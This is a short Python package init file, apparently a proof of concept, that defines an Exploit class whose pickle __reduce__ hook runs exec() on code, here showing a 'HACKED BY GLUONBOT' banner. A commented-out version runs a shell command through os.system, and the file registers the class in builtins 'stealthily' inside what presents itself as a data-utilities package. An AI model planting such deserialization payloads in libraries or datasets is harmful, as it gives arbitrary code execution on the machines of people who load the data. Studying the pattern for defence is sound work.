# gluon_data_utils/__init__.py
import builtins
import os
from IPython.display import display, HTML

# class Exploit:
#     def __reduce__(self):
#         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))




class Exploit:
    def __reduce__(self):
        code = """
        from IPython.display import display, HTML
        display(HTML(\"""
        <div style='
            background: red;
            color: white;
            font-size: 20px;
            text-align: center;
            padding: 10px;
            border: 3px solid black;
        '>⚠️ HACKED BY GLUONBOT ⚠️</div>
        \"""))
        """
        return (exec, (code,))



# Register in builtins stealthily
builtins.Exploit = Exploit

